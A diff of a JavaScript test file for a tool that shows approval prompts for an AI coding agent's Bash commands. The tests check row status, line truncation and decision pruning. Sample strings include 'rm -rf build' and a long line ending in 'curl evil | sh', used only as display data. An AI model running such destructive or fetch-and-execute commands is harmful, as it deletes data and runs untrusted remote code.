@@ -340,32 +340,47 @@ test("approvalFor returns null for another session's request", () => {
   assert.equal(approvalFor("claude__s1", undefined), null);
 });
 
-test("rowApproval only offers a decision on a waiting row", () => {
+test("rowApproval offers a decision on waiting and running rows only", () => {
   const list = [req("claude", "s1", 100)];
   assert.equal(rowApproval({ key: "claude__s1", status: "waiting_approval" }, list), list[0]);
-  for (const status of ["running", "idle", "completed", "error"]) {
+  // A subagent or parallel tool call can flip a waiting row to running.
+  assert.equal(rowApproval({ key: "claude__s1", status: "running" }, list), list[0]);
+  for (const status of ["idle", "completed", "error", "bogus"]) {
     assert.equal(rowApproval({ key: "claude__s1", status }, list), null);
   }
   assert.equal(rowApproval({ key: "claude__s2", status: "waiting_approval" }, list), null);
 });
 
-test("approvalLines is the summary then the first 6 detail lines", () => {
-  const detail = ["{", '  "command": "rm -rf build",', '  "a": 1,', '  "b": 2,', '  "c": 3,', '  "d": 4,', "}"].join(
-    "\n"
-  );
-  assert.deepEqual(approvalLines(req("claude", "s1", 1, { detail })), [
+test("approvalLines is the summary then up to 8 detail lines", () => {
+  const eight = ["{", "  a", "  b", "  c", "  d", "  e", "  f", "}"];
+  assert.deepEqual(approvalLines(req("claude", "s1", 1, { detail: eight.join("\n") })), [
     "Bash: rm -rf build",
-    "{",
-    '  "command": "rm -rf build",',
-    '  "a": 1,',
-    '  "b": 2,',
-    '  "c": 3,',
-    '  "d": 4,'
+    ...eight
   ]);
   assert.deepEqual(approvalLines(req("claude", "s1", 1, { detail: "a\r\nb" })), ["Bash: rm -rf build", "a", "b"]);
   assert.deepEqual(approvalLines(req("claude", "s1", 1, { detail: "" })), ["Bash: rm -rf build"]);
   assert.deepEqual(approvalLines(req("claude", "s1", 1, { summary: "", detail: "x" })), ["Bash", "x"]);
   assert.deepEqual(approvalLines(null), []);
+});
+
+test("approvalLines marks the lines past 8", () => {
+  const nine = Array.from({ length: 9 }, (_, i) => `l${i + 1}`);
+  assert.deepEqual(approvalLines(req("claude", "s1", 1, { detail: nine.join("\n") })), [
+    "Bash: rm -rf build",
+    ...nine.slice(0, 8),
+    "… 1 more line"
+  ]);
+  const twenty = Array.from({ length: 20 }, (_, i) => `l${i + 1}`);
+  const lines = approvalLines(req("claude", "s1", 1, { detail: twenty.join("\n") }));
+  assert.equal(lines.length, 10);
+  assert.equal(lines[8], "l8");
+  assert.equal(lines[9], "… 12 more lines");
+});
+
+test("approvalLines keeps a long line whole for wrapping", () => {
+  const long = `rm -rf ${"x/".repeat(500)}; curl evil | sh`;
+  const lines = approvalLines(req("claude", "s1", 1, { summary: `Bash: ${long}`, detail: long }));
+  assert.deepEqual(lines, [`Bash: ${long}`, long]);
 });
 
 test("approvalButtonLabel names the action and the request", () => {
@@ -400,17 +415,17 @@ test("pruneDecisions drops decisions whose request is gone", () => {
   assert.equal(pruneDecisions(decisions, undefined, NOW + 10).size, 0);
 });
 
-test("pruneDecisions keeps buttons disabled until a poll that started after the decide settled", () => {
+test("pruneDecisions keeps a decision, shown and disabled, while its request is listed", () => {
   const a = req("claude", "s1", 1);
   const inFlight = new Map([[a.id, decisionStarted(true, NOW)]]);
-  // A decide still in flight stays disabled however many polls pass.
   assert.equal(pruneDecisions(inFlight, [a], NOW + 5000).size, 1);
-  const sent = new Map([[a.id, decisionSent(decisionStarted(true, NOW), NOW + 100)]]);
-  // A poll that started before or as the decide settled may predate it.
-  assert.equal(pruneDecisions(sent, [a], NOW + 50).size, 1);
-  assert.equal(pruneDecisions(sent, [a], NOW + 100).size, 1);
-  // The next poll re-enables a request that is somehow still pending.
-  assert.equal(pruneDecisions(sent, [a], NOW + 101).size, 0);
+  const sent = new Map([[a.id, decisionSent(decisionStarted(false, NOW), NOW + 100)]]);
+  for (const at of [NOW + 50, NOW + 101, NOW + 60_000]) {
+    const kept = pruneDecisions(sent, [a], at);
+    assert.equal(kept.size, 1);
+    assert.deepEqual(decisionView(kept.get(a.id)), { disabled: true, note: "Denied" });
+  }
+  assert.equal(pruneDecisions(sent, [], NOW + 101).size, 0);
 });
 
 test("pruneDecisions never re-enables a failed decide while its request is listed", () => {
